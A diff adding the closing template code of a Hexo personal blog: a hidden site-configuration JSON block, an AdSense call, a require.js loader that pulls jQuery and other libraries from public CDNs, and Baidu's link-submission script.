+  <p id="theme_str" hidden>{&quot;title&quot;:&quot;ios&#39;s blog&quot;,&quot;subtitle&quot;:null,&quot;description&quot;:null,&quot;author&quot;:&quot;ios&quot;,&quot;language&quot;:&quot;zh-CN&quot;,&quot;timezone&quot;:null,&quot;url&quot;:&quot;http://iosmosis.github.io&quot;,&quot;root&quot;:&quot;/&quot;,&quot;permalink&quot;:&quot;:year/:month/:day/:title/&quot;,&quot;permalink_defaults&quot;:null,&quot;source_dir&quot;:&quot;source&quot;,&quot;public_dir&quot;:&quot;public&quot;,&quot;tag_dir&quot;:&quot;tags&quot;,&quot;archive_dir&quot;:&quot;archives&quot;,&quot;category_dir&quot;:&quot;categories&quot;,&quot;code_dir&quot;:&quot;downloads/code&quot;,&quot;i18n_dir&quot;:&quot;:lang&quot;,&quot;skip_render&quot;:null,&quot;new_post_name&quot;:&quot;:title.md&quot;,&quot;default_layout&quot;:&quot;post&quot;,&quot;titlecase&quot;:false,&quot;external_link&quot;:true,&quot;filename_case&quot;:0,&quot;render_drafts&quot;:false,&quot;post_asset_folder&quot;:true,&quot;relative_link&quot;:false,&quot;future&quot;:true,&quot;highlight&quot;:{&quot;enable&quot;:false,&quot;auto_detect&quot;:false,&quot;line_number&quot;:true,&quot;tab_replace&quot;:null},&quot;default_category&quot;:&quot;uncategorized&quot;,&quot;category_map&quot;:null,&quot;tag_map&quot;:null,&quot;date_format&quot;:&quot;YYYY-MM-DD&quot;,&quot;time_format&quot;:&quot;HH:mm:ss&quot;,&quot;per_page&quot;:10,&quot;pagination_dir&quot;:&quot;page&quot;,&quot;theme&quot;:&quot;huhu&quot;,&quot;deploy&quot;:{&quot;type&quot;:&quot;git&quot;,&quot;repository&quot;:&quot;git@github.com:iosmosis/iosmosis.github.io.git&quot;,&quot;branch&quot;:&quot;master&quot;,&quot;message&quot;:&quot;Site updated at {{ now(\&quot;YYYY-MM-DD HH:mm:ss\&quot;) }}&quot;},&quot;hljs&quot;:{&quot;enable&quot;:true,&quot;line_number&quot;:&quot;frontend&quot;,&quot;trim_indent&quot;:&quot;backend&quot;,&quot;copy_code&quot;:false},&quot;live2d&quot;:{&quot;enable&quot;:true,&quot;scriptFrom&quot;:&quot;local&quot;,&quot;pluginRootPath&quot;:&quot;live2dw/&quot;,&quot;pluginJsPath&quot;:&quot;lib/&quot;,&quot;pluginModelPath&quot;:&quot;assets/&quot;,&quot;model&quot;:{&quot;use&quot;:&quot;live2d-widget-model-koharu&quot;},&quot;display&quot;:{&quot;position&quot;:&quot;right&quot;,&quot;width&quot;:150,&quot;height&quot;:300},&quot;mobile&quot;:{&quot;show&quot;:true}},&quot;prism_plugin&quot;:{&quot;mode&quot;:&quot;preprocess&quot;,&quot;theme&quot;:&quot;ghcolors&quot;,&quot;line_number&quot;:false,&quot;custom_css&quot;:&quot;path/to/your/custom.css&quot;},&quot;jsonContent&quot;:{&quot;meta&quot;:false,&quot;pages&quot;:false,&quot;posts&quot;:{&quot;title&quot;:true,&quot;date&quot;:true,&quot;path&quot;:true,&quot;text&quot;:true,&quot;raw&quot;:false,&quot;content&quot;:false,&quot;slug&quot;:false,&quot;updated&quot;:false,&quot;comments&quot;:false,&quot;link&quot;:false,&quot;permalink&quot;:false,&quot;excerpt&quot;:false,&quot;categories&quot;:false,&quot;tags&quot;:true}},&quot;archive_generator&quot;:{&quot;per_page&quot;:10,&quot;yearly&quot;:true,&quot;monthly&quot;:true,&quot;daily&quot;:false},&quot;baidusitemap&quot;:{&quot;path&quot;:&quot;baidusitemap.xml&quot;},&quot;category_generator&quot;:{&quot;per_page&quot;:10},&quot;feed&quot;:{&quot;type&quot;:&quot;atom&quot;,&quot;limit&quot;:20,&quot;hub&quot;:&quot;&quot;,&quot;content&quot;:true,&quot;path&quot;:&quot;atom.xml&quot;},&quot;index_generator&quot;:{&quot;per_page&quot;:10,&quot;order_by&quot;:&quot;-date&quot;},&quot;sitemap&quot;:{&quot;path&quot;:&quot;sitemap.xml&quot;},&quot;marked&quot;:{&quot;gfm&quot;:true,&quot;pedantic&quot;:false,&quot;sanitize&quot;:false,&quot;tables&quot;:true,&quot;breaks&quot;:true,&quot;smartLists&quot;:true,&quot;smartypants&quot;:true},&quot;server&quot;:{&quot;port&quot;:4000,&quot;log&quot;:false,&quot;ip&quot;:&quot;0.0.0.0&quot;,&quot;compress&quot;:false,&quot;header&quot;:true},&quot;tag_generator&quot;:{&quot;per_page&quot;:10},&quot;menu&quot;:{&quot;home&quot;:&quot;/&quot;,&quot;archives&quot;:&quot;/archives&quot;,&quot;about&quot;:&quot;/about&quot;,&quot;Link&quot;:&quot;/link&quot;},&quot;logo&quot;:&quot;/images/logo.png&quot;,&quot;categories_max&quot;:5,&quot;tags_max&quot;:10,&quot;site_search&quot;:true,&quot;rss&quot;:&quot;/atom.xml&quot;,&quot;follow&quot;:{&quot;github&quot;:&quot;https://github.com/iosmosis&quot;,&quot;QQ&quot;:&quot;2417117320&quot;},&quot;search_url&quot;:&quot;/search.xml&quot;,&quot;site_icp&quot;:&quot;&quot;,&quot;site_friends&quot;:{&quot;房间里的小猫咪&quot;:&quot;http://baidu.com&quot;},&quot;share&quot;:[&quot;weibo&quot;,&quot;weixin&quot;,&quot;qqkongjian&quot;,&quot;QQ&quot;,&quot;douban&quot;,&quot;facebook&quot;,&quot;twitter&quot;,&quot;google&quot;],&quot;cdn_module&quot;:{&quot;av_min&quot;:&quot;https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min&quot;,&quot;pjax&quot;:&quot;https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min&quot;,&quot;jquery&quot;:&quot;https://cdn.bootcss.com/jquery/3.4.1/jquery.min&quot;,&quot;confirm&quot;:&quot;https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min&quot;,&quot;fancybox&quot;:&quot;https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min&quot;,&quot;algoliasearch&quot;:&quot;https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min&quot;},&quot;baidu_push&quot;:true,&quot;reward&quot;:{&quot;weixin&quot;:&quot;images/weixin.png&quot;,&quot;zhifubao&quot;:&quot;images/zhifubao.png&quot;},&quot;service_worker&quot;:{&quot;open&quot;:false}}</p>
+</html>
+<script type="text/javascript">
+  window.addEventListener('load', function() {
+    ;(adsbygoogle = window.adsbygoogle || []).push({
+      google_ad_client: 'undefined',
+      enable_page_level_ads: true
+    })
+
+    window.THEME_CONFIG = JSON.parse(document.getElementById('theme_str').innerText)
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs &&
+      window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {
+        require.config({
+          paths: {
+            // site
+            util: 'util',
+            share: 'share',
+            search: 'search',
+            iconfont: 'iconfont',
+            registerSW: 'registerSW',
+            valine: ['cdn/Valine.min'],
+
+            // cdn
+            av: ['https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min', 'cdn/av-min'],
+            pjax: ['https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min', 'cdn/pjax.min'],
+            jquery: ['https://cdn.bootcss.com/jquery/3.4.1/jquery.min', 'cdn/jquery.min'],
+            confirm: ['https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min', 'cdn/jquery.confirm.min'],
+            fancybox: ['https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min', 'cdn/jquery.fancybox.min'],
+            algoliasearch: ['https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min', 'cdn/algoliasearchLite.min']
+          },
+
+          map: {
+            '*': {
+              css: 'https://cdn.bootcss.com/require-css/0.1.10/css.min.js'
+            }
+          },
+
+          shim: {
+            fancybox: {
+              deps: ['css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css']
+            },
+            confirm: {
+              deps: ['css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css']
+            }
+          },
+
+          // 加载超时
+          waitSeconds: 3
+        })
+      })
+  })
+</script>
+
+<script>
+  ;(function() {
+    var bp = document.createElement('script')
+    var curProtocol = window.location.protocol.split(':')[0]
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+    } else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+    }
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(bp, s)
+  })()
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@3.33.0/dist/algoliasearchLite.min.js"></script>
+<script></script>
